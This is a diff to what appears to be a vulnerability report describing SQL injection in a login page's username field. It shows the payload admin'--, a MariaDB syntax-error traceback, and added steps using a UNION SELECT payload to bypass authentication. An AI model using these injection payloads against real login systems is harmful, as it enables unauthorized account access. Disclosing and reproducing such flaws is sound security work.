@@ -5,7 +5,7 @@
 ## Description
 > In the "login" page, Username has SQL Injection vulnerability.
 
-## Proof of Concept
+## Reproduction Steps
 1. Go to login page /login
 2. Username: admin'--
 3. Password: password1
@@ -21,6 +21,6 @@ Traceback (most recent call last):
     raise errorvalue
 ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1")
 ```
-
-## Reproduction Steps
-1. 
+6. Username: admin' UNION SELECT "password1" as password FROM admins where ' '=' ';--
+7. Password: password1
+8. Press Log In button!
